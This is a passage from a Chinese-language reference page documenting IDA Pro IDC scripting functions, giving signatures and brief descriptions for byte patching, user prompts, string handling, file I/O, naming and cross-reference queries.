<h3 id="04-PatByte"><a href="#04-PatByte" class="headerlink" title="04 PatByte"></a>04 PatByte</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PatchByte</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> val)</span></span></span><br></pre></td></tr></table></figure>

<p>设置虚拟地址<strong>addr</strong>处的一个字节值</p>
<h3 id="05-PatchWord"><a href="#05-PatchWord" class="headerlink" title="05 PatchWord"></a>05 PatchWord</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PatchWord</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> val)</span></span></span><br></pre></td></tr></table></figure>

<p>设置虚拟地址<strong>addr</strong>处的一个字值</p>
<h3 id="06-PatchDword"><a href="#06-PatchDword" class="headerlink" title="06 PatchDword"></a>06 PatchDword</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PatchDword</span><span class="params">(<span class="keyword">long</span> addr,<span class="keyword">long</span> val)</span></span></span><br></pre></td></tr></table></figure>

<p>设置虚拟地址addr处的一个双字值</p>
<h3 id="07-isLoaded"><a href="#07-isLoaded" class="headerlink" title="07 isLoaded"></a>07 isLoaded</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isLoaded</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure>

<p>如果addr包含有效数据，则返回1，否则返回0</p>
<h2 id="0x02-用户交互函数"><a href="#0x02-用户交互函数" class="headerlink" title="0x02 用户交互函数"></a>0x02 用户交互函数</h2><h3 id="01-Message"><a href="#01-Message" class="headerlink" title="01 Message"></a>01 Message</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Message</span><span class="params">(<span class="built_in">string</span> format,...)</span></span></span><br></pre></td></tr></table></figure>

<p>在输出窗口打印一条格式化消息。这个函数类似于C语言的<strong>printf</strong>函数，并接受<strong>printf</strong>风格的格式化字符串</p>
<h3 id="02-print"><a href="#02-print" class="headerlink" title="02 print"></a>02 print</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(...)</span></span></span><br></pre></td></tr></table></figure>

<p>在输出窗口中打印每个参数的字符串表示形式</p>
<h3 id="03-Warning"><a href="#03-Warning" class="headerlink" title="03 Warning"></a>03 Warning</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Warning</span><span class="params">(<span class="built_in">string</span> format,...)</span></span></span><br></pre></td></tr></table></figure>

<p>在对话框中显示一条格式化消息</p>
<h3 id="04-AskStr"><a href="#04-AskStr" class="headerlink" title="04 AskStr"></a>04 AskStr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">AskFile</span><span class="params">(<span class="built_in">string</span> <span class="keyword">default</span>, <span class="built_in">string</span> promat)</span></span></span><br></pre></td></tr></table></figure>

<p>显示一个输入框，要求用户输入一个字符串值。如果操作成功，则返回用户的字符串；如果对话框被取消，则返回0</p>
<h3 id="05-AskFile"><a href="#05-AskFile" class="headerlink" title="05 AskFile"></a>05 AskFile</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">AskFile</span><span class="params">(<span class="keyword">long</span> doSave, <span class="built_in">string</span> mask, <span class="built_in">string</span> promat)</span></span></span><br></pre></td></tr></table></figure>

<p>显示一个文件选择对话框，以简化选择文件的任务。你可以创建新文件保存数据(<strong>doSave</strong>=1)，或选择现有的文件读取数据(<strong>doSave</strong>=0)。你可以根据<strong>mask</strong>(如*.<em>或\</em>.idc)过滤显示的文件列表。如果操作成功，则返回选定文件的名称；如果对话框被取消，则返回0</p>
<h3 id="06-AskYN"><a href="#06-AskYN" class="headerlink" title="06 AskYN"></a>06 AskYN</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">AskYN</span><span class="params">(<span class="keyword">long</span> <span class="keyword">default</span>, <span class="built_in">string</span> prompt)</span></span></span><br></pre></td></tr></table></figure>

<p>用一个答案为“是”或“否”的问题提示用户，突出一个默认的答案（1为是，0为否，-1为取消）。返回值是一个表示选定答案的整数</p>
<h3 id="07-ScreenEA"><a href="#07-ScreenEA" class="headerlink" title="07 ScreenEA"></a>07 ScreenEA</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ScreenEA</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>返回当前光标所在位置的虚拟地址</p>
<h3 id="08-Jump"><a href="#08-Jump" class="headerlink" title="08 Jump"></a>08 Jump</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Jump</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure>

<p>跳转到反汇编窗口的指定地址</p>
<h2 id="0x03-字符串操纵函数"><a href="#0x03-字符串操纵函数" class="headerlink" title="0x03 字符串操纵函数"></a>0x03 字符串操纵函数</h2><h3 id="01-form"><a href="#01-form" class="headerlink" title="01 form"></a>01 form</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">form</span><span class="params">(<span class="built_in">string</span> format,...)</span></span></span><br></pre></td></tr></table></figure>

<p>返回一个新字符串，该字符串根据所提供的格式化字符串和值进行格式化。这个函数基本上等同于C语言的<strong>sprintf</strong>函数</p>
<h3 id="02-sprintf"><a href="#02-sprintf" class="headerlink" title="02 sprintf"></a>02 sprintf</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">sprintf</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>在IDA5.6中，<strong>sprintf</strong>用于替代<strong>form</strong></p>
<h3 id="03-atol"><a href="#03-atol" class="headerlink" title="03 atol"></a>03 atol</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">atol</span><span class="params">(<span class="built_in">string</span> val)</span></span></span><br></pre></td></tr></table></figure>

<p>将十进制值val转换成对应的整数值</p>
<h3 id="04-xtol"><a href="#04-xtol" class="headerlink" title="04 xtol"></a>04 xtol</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">xtol</span><span class="params">(<span class="built_in">string</span> val)</span></span></span><br></pre></td></tr></table></figure>

<p>将十六进制值<strong>val</strong>（可选择以0x开头）转换成对应的整数值</p>
<h3 id="05-ltoa"><a href="#05-ltoa" class="headerlink" title="05 ltoa"></a>05 ltoa</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">IItoa</span><span class="params">(<span class="keyword">long</span> val, <span class="keyword">long</span> radix)</span></span></span><br></pre></td></tr></table></figure>

<p>一指定的<strong>radix</strong>（2、8、10或16）返回<strong>val</strong>的字符串值</p>
<h3 id="06-ord"><a href="#06-ord" class="headerlink" title="06 ord"></a>06 ord</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ord</span><span class="params">(<span class="built_in">string</span> ch)</span></span></span><br></pre></td></tr></table></figure>

<p>返回单字符字符串<strong>ch</strong>的<strong>ASCII</strong>值</p>
<h3 id="07-strlen"><a href="#07-strlen" class="headerlink" title="07 strlen"></a>07 strlen</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">strlen</span><span class="params">(<span class="built_in">string</span> str)</span></span></span><br></pre></td></tr></table></figure>

<p>返回所提供字符串的长度</p>
<h3 id="08-strstr"><a href="#08-strstr" class="headerlink" title="08 strstr"></a>08 strstr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">strstr</span><span class="params">(<span class="built_in">string</span> str, <span class="built_in">string</span> substr)</span></span></span><br></pre></td></tr></table></figure>

<p>返回<strong>str</strong>中<strong>substr</strong>的索引。如果没有发现子字符串，则返回-1</p>
<h3 id="09-substr"><a href="#09-substr" class="headerlink" title="09 substr"></a>09 substr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">substr</span><span class="params">(<span class="built_in">string</span> str, <span class="keyword">long</span> start, <span class="keyword">long</span> end)</span></span></span><br></pre></td></tr></table></figure>

<p>返回包含<strong>str</strong>中由<strong>start</strong>到<strong>end-1</strong>位置的字符的子字符串。如果使用分片，此函数等同于<strong>str[start:end]</strong></p>
<h2 id="0x04-文件输入-输出函数"><a href="#0x04-文件输入-输出函数" class="headerlink" title="0x04 文件输入/输出函数"></a>0x04 文件输入/输出函数</h2><h3 id="01-fopen"><a href="#01-fopen" class="headerlink" title="01 fopen"></a>01 fopen</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">fopen</span><span class="params">(<span class="built_in">string</span> filename, <span class="built_in">string</span> mode)</span></span></span><br></pre></td></tr></table></figure>

<p>返回一个整数文件句柄（如果发生错误，则返回0），供所有<strong>IDC</strong>文件输入/输出函数使用。<strong>mode</strong>参数与C语言的fopen函数使用的模式（r表示读取，w表示写入，等等）类似</p>
<h3 id="02-fclose"><a href="#02-fclose" class="headerlink" title="02 fclose"></a>02 fclose</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fclose</span><span class="params">(<span class="keyword">long</span> handle)</span></span></span><br></pre></td></tr></table></figure>

<p>关闭fopen中文件句柄指定的文件</p>
<h3 id="03-filelength"><a href="#03-filelength" class="headerlink" title="03 filelength"></a>03 filelength</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">filelength</span><span class="params">(<span class="keyword">long</span> handle)</span></span></span><br></pre></td></tr></table></figure>

<p>返回指定文件的长度，如果发生错误，则返回-1</p>
<h3 id="04-fgetc"><a href="#04-fgetc" class="headerlink" title="04 fgetc"></a>04 fgetc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">fgetc</span><span class="params">(<span class="keyword">long</span> handle)</span></span></span><br></pre></td></tr></table></figure>

<p>从给定的文件中读取一个字节，如果发生错误，则返回-1</p>
<h3 id="05-fputc"><a href="#05-fputc" class="headerlink" title="05 fputc"></a>05 fputc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">fputc</span><span class="params">(<span class="keyword">long</span> val, <span class="keyword">long</span> handle)</span></span></span><br></pre></td></tr></table></figure>

<p>写入一个字节到给定文件中。如果操作成功，则返回0；如果发生错误，则返回-1</p>
<h3 id="06-fprintf"><a href="#06-fprintf" class="headerlink" title="06 fprintf"></a>06 fprintf</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">fprintf</span><span class="params">(<span class="keyword">long</span> handle, <span class="built_in">string</span> format, ...)</span></span></span><br></pre></td></tr></table></figure>

<p>将一个格式化字符串写入到给定文件中</p>
<h3 id="07-writestr"><a href="#07-writestr" class="headerlink" title="07 writestr"></a>07 writestr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">writestr</span><span class="params">(<span class="keyword">long</span> handle, <span class="built_in">string</span> str)</span></span></span><br></pre></td></tr></table></figure>

<p>将指定的字符串写入到给定的文件中</p>
<h3 id="08-readstr"><a href="#08-readstr" class="headerlink" title="08 readstr"></a>08 readstr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span>/<span class="function"><span class="keyword">long</span> <span class="title">readstr</span><span class="params">(<span class="keyword">long</span> handle)</span></span></span><br></pre></td></tr></table></figure>

<p>从给定文件中读取一个字符串。这个函数读取到下一个换行符为止的字符串（包括非<strong>ASCII</strong>字符），包括换行符本身（<strong>ASCII 0xA</strong>）。如果操作成功，则返回字符串；如果读取到文件结尾，则返回<strong>-1</strong></p>
<h3 id="09-writelong"><a href="#09-writelong" class="headerlink" title="09 writelong"></a>09 writelong</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">writelong</span><span class="params">(<span class="keyword">long</span> handle, <span class="keyword">long</span> val, <span class="keyword">long</span> bigendian)</span></span></span><br></pre></td></tr></table></figure>

<p>使用大端<strong>(bigendian =1)</strong>或小端<strong>(bigendian =0)</strong>字节顺序将一个4字节整数写入到给定文件</p>
<h3 id="10-readlong"><a href="#10-readlong" class="headerlink" title="10 readlong"></a>10 readlong</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">readlong</span><span class="params">(<span class="keyword">long</span> handle, <span class="keyword">long</span> bigendian)</span></span></span><br></pre></td></tr></table></figure>

<p>使用大端<strong>(bigendian =1)</strong>或小端<strong>(bigendian =0)</strong>字节顺序从给定的文件中读取一个4字节整数</p>
<h3 id="11-writeshort"><a href="#11-writeshort" class="headerlink" title="11 writeshort"></a>11 writeshort</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">writeshort</span><span class="params">(<span class="keyword">long</span> handle, <span class="keyword">long</span> val, <span class="keyword">long</span> bigendian)</span></span></span><br></pre></td></tr></table></figure>

<p>使用大端<strong>(bigendian =1)</strong>或小端<strong>(bigendian =0)</strong>字节顺序将一个2字节整数写入到给定文件</p>
<h3 id="12-readshort"><a href="#12-readshort" class="headerlink" title="12 readshort"></a>12 readshort</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">readshort</span><span class="params">(<span class="keyword">long</span> handle, <span class="keyword">long</span> bigendian)</span></span></span><br></pre></td></tr></table></figure>

<p>使用大端<strong>(bigendian =1)</strong>或小端<strong>(bigendian =0)</strong>字节顺序从给定的文件中读取一个2字节整数</p>
<h3 id="13-loadfile"><a href="#13-loadfile" class="headerlink" title="13 loadfile"></a>13 loadfile</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">loadfile</span><span class="params">(<span class="keyword">long</span> handle, <span class="keyword">long</span> pos, <span class="keyword">long</span> addr, <span class="keyword">long</span> length)</span></span></span><br></pre></td></tr></table></figure>

<p>从给定文件的<strong>pos</strong>位置读取<strong>length</strong>数量的字节，并将这些字节写入到以<strong>addr</strong>地址开头的数据库中</p>
<h3 id="14-savefile"><a href="#14-savefile" class="headerlink" title="14 savefile"></a>14 savefile</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">savefile</span><span class="params">(<span class="keyword">long</span> handle, <span class="keyword">long</span> pos, <span class="keyword">long</span> addr, <span class="keyword">long</span> length)</span></span></span><br></pre></td></tr></table></figure>

<p>将以addr数据库地址开头的length数量的字节写入给定文件的<strong>pos</strong>位置</p>
<h2 id="0x05-操纵数据库名称"><a href="#0x05-操纵数据库名称" class="headerlink" title="0x05 操纵数据库名称"></a>0x05 操纵数据库名称</h2><h3 id="01-Name"><a href="#01-Name" class="headerlink" title="01 Name"></a>01 Name</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">Name</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure>

<p>返回与给定地址有关的名称，如果该位置没有名称，则返回空字符串。如果名称被标记为局部名称，这个函数并不返沪用户定义的名称</p>
<h3 id="02-NameEx"><a href="#02-NameEx" class="headerlink" title="02 NameEx"></a>02 NameEx</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">NameEx</span><span class="params">(<span class="keyword">long</span> from, <span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure>

<p>返回与addr有关的名称。如果该位置没有名称，则返回空字符串。如果<strong>from</strong>是一个同样包含<strong>addr</strong>的函数中的地址，则这个函数返回用户定义的局部名称</p>
<h3 id="03-MakeNameEx"><a href="#03-MakeNameEx" class="headerlink" title="03 MakeNameEx"></a>03 MakeNameEx</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">MakeNameEx</span><span class="params">(<span class="keyword">long</span> addr, <span class="built_in">string</span> name, <span class="keyword">long</span> flags)</span></span></span><br></pre></td></tr></table></figure>

<p>将给定的名称分配给定的地址。该名称使用flags位掩码中指定的属性创建而成。这些标志在帮助系统中的<strong>MakeNameEx</strong>文档中有记载描述，可用于指定各种属性，如名称是局部名称还是公共名称、名称是否应在名称窗口中列出</p>
<h3 id="04-long-LocByName"><a href="#04-long-LocByName" class="headerlink" title="04 long LocByName"></a>04 long LocByName</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">LocByName</span><span class="params">(<span class="built_in">string</span> name)</span></span></span><br></pre></td></tr></table></figure>

<p>返回一个位置（名称已给定）的地址。如果数据库中没有这个名称，则返回<strong>BADADDR(-1)</strong></p>
<h3 id="05-long-LocByNameEX"><a href="#05-long-LocByNameEX" class="headerlink" title="05 long LocByNameEX"></a>05 long LocByNameEX</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">LocByName</span><span class="params">(<span class="keyword">long</span> funcaddr, <span class="built_in">string</span> localname)</span></span></span><br></pre></td></tr></table></figure>

<p>在包含funcaddr的函数中搜索给定的局部名称。如果给定的函数中没有这个名称，则返回<strong>BADADDR(-1)</strong></p>
<h2 id="0x06-处理函数的函数"><a href="#0x06-处理函数的函数" class="headerlink" title="0x06 处理函数的函数"></a>0x06 处理函数的函数</h2><h3 id="01-GetFunctionAttr"><a href="#01-GetFunctionAttr" class="headerlink" title="01 GetFunctionAttr"></a>01 GetFunctionAttr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">GetFunctionAttr</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> attrib)</span></span></span><br></pre></td></tr></table></figure>

<p>返回包含给定地址的函数的被请求的属性。请参考IDC帮助文档了解属性常量。例如，要查找一个函数的结束地址，可以使用<code>GetFunctionAttr(addr, FUNCATTR_END)</code></p>
<h3 id="02-GetFunctionName"><a href="#02-GetFunctionName" class="headerlink" title="02 GetFunctionName"></a>02 GetFunctionName</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">GetFunctionName</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure>

<p>返回包含给定地址的函数的名称。如果给定的地址并不属于一个函数，则返回一个空字符串</p>
<h3 id="03-NextFunction"><a href="#03-NextFunction" class="headerlink" title="03 NextFunction"></a>03 NextFunction</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">NextFunction</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure>

<p>返回给定地址后的下一个函数的起始地址。如果数据库中给定地址后没有其他函数，则返回-1</p>
<h3 id="04-PrevFunction"><a href="#04-PrevFunction" class="headerlink" title="04 PrevFunction"></a>04 PrevFunction</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">PrevFunction</span><span class="params">(<span class="keyword">long</span> addr)</span></span></span><br></pre></td></tr></table></figure>

<p>返回给定地址之前距离最近的函数起始地址。如果在给定地址之前没有函数，则返回-1</p>
<h3 id="05-long-LocBy"><a href="#05-long-LocBy" class="headerlink" title="05 long LocBy"></a>05 long LocBy</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">LocBy</span><span class="params">(<span class="built_in">string</span> Name)</span></span></span><br></pre></td></tr></table></figure>

<p>根据函数的名称，返回该函数的起始地址</p>
<h2 id="0x07-代码交叉引用函数"><a href="#0x07-代码交叉引用函数" class="headerlink" title="0x07 代码交叉引用函数"></a>0x07 代码交叉引用函数</h2><h3 id="01-Rfirst"><a href="#01-Rfirst" class="headerlink" title="01 Rfirst"></a>01 Rfirst</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">Rfirst</span><span class="params">(<span class="keyword">long</span> from)</span></span></span><br></pre></td></tr></table></figure>

<p>返回给定地址向其转交控制权的第一个位置。如果给定的地址没有引用其他地址，则返回<strong>BADADDR(-1)</strong></p>
<h3 id="02-Rnext"><a href="#02-Rnext" class="headerlink" title="02 Rnext"></a>02 Rnext</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">Rnext</span><span class="params">(<span class="keyword">long</span> from, <span class="keyword">long</span> current)</span></span></span><br></pre></td></tr></table></figure>

<p>如果<strong>current</strong>已经在前一次调用<strong>Rfirst</strong>或<strong>Rnext</strong>时返回，则返回给定地址（<strong>from</strong>）转交控制权的下一个位置。如果没有其他交叉引用存在，<strong>BADADDR(-1)</strong></p>
<h3 id="03-XrefType"><a href="#03-XrefType" class="headerlink" title="03 XrefType"></a>03 XrefType</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">XrefType</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>返回一个常量，说明某个交叉引用查询函数（如<strong>Rfirst</strong>）返回的最后一个交叉引用的类型。对于代码交叉引用，这些常量包括<strong>fl_CN</strong>(近调用)、<strong>fl_CF</strong>(远调用)、<strong>fl_JN</strong>(近跳转)、<strong>fl_JF</strong>(远跳转)和<strong>fl_F</strong>(普通顺序流)</p>
<h3 id="04-RfirstB"><a href="#04-RfirstB" class="headerlink" title="04 RfirstB"></a>04 RfirstB</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">RfirstB</span><span class="params">(<span class="keyword">long</span> to)</span></span></span><br></pre></td></tr></table></figure>

<p>返回转交控制权到给定地址的第一个位置。如果不存在对给定地址的交叉引用，则返回<strong>BADADDR(-1)</strong></p>
<h3 id="05-RnextB"><a href="#05-RnextB" class="headerlink" title="05 RnextB"></a>05 RnextB</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">RnextB</span><span class="params">(<span class="keyword">long</span> to, <span class="keyword">long</span> current)</span></span></span><br></pre></td></tr></table></figure>

<p>如果<strong>current</strong>已经在前一次调用<strong>RfirstB</strong>或<strong>RnextB</strong>时返回，则返回下一个转交控制权到给定地址（<strong>to</strong>）的位置。如果不存在其他对给定位置的交叉引用，<strong>BADADDR(-1)</strong></p>
<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><h3 id="01-Dfirst"><a href="#01-Dfirst" class="headerlink" title="01 Dfirst"></a>01 Dfirst</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">Dfirst</span><span class="params">(<span class="keyword">long</span> from)</span></span></span><br></pre></td></tr></table></figure>

<p>返回给定地址引用一个数据值的第一个位置。如果给定的地址没有引用其他地址，则返回<strong>BADADDR(-1)</strong></p>
<h3 id="02-Dnext"><a href="#02-Dnext" class="headerlink" title="02 Dnext"></a>02 Dnext</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">Dnext</span><span class="params">(<span class="keyword">long</span> from, <span class="keyword">long</span> current)</span></span></span><br></pre></td></tr></table></figure>

<p>如果<strong>current</strong>已经在前一次调用<strong>Dfirst</strong>或<strong>Dnext</strong>时返回，则返回给定地址（<strong>from</strong>）向其引用一个数据值的下一个位置。如果没有其他交叉引用存在，<strong>BADADDR(-1)</strong></p>
<h3 id="03-XrefType-1"><a href="#03-XrefType-1" class="headerlink" title="03 XrefType"></a>03 XrefType</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">XrefType</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>返回一个常量，说明某个交叉引用查询函数（如<strong>Dfirst</strong>）返回的最后一个交叉引用的类型。对于数据交叉引用，这些常量包括<strong>dr_0</strong>(提供的偏移量)、<strong>dr_W</strong>(数据写入)和<strong>dr_R</strong>(数据读取)</p>
<h3 id="04-DfirstB"><a href="#04-DfirstB" class="headerlink" title="04 DfirstB"></a>04 DfirstB</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">DfirstB</span><span class="params">(<span class="keyword">long</span> to)</span></span></span><br></pre></td></tr></table></figure>

<p>返回给定地址作为数据引用的第一个位置。如果不存在对给定地址的交叉引用，则返回<strong>BADADDR(-1)</strong></p>
<h3 id="05-DnextB"><a href="#05-DnextB" class="headerlink" title="05 DnextB"></a>05 DnextB</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">DnextB</span><span class="params">(<span class="keyword">long</span> to, <span class="keyword">long</span> current)</span></span></span><br></pre></td></tr></table></figure>

<p>如果<strong>current</strong>已经在前一次调用<strong>DfirstB</strong>或<strong>DnextB</strong>时返回，则返回将给定地址（<strong>to</strong>）作为数据引用的下一次位置。如果没有其他交叉引用存在，<strong>BADADDR(-1)</strong></p>
<h2 id="0x09-数据库操纵函数"><a href="#0x09-数据库操纵函数" class="headerlink" title="0x09 数据库操纵函数"></a>0x09 数据库操纵函数</h2><h3 id="01-MakeUnkn"><a href="#01-MakeUnkn" class="headerlink" title="01 MakeUnkn"></a>01 MakeUnkn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MakeUnkn</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> flags)</span></span></span><br></pre></td></tr></table></figure>

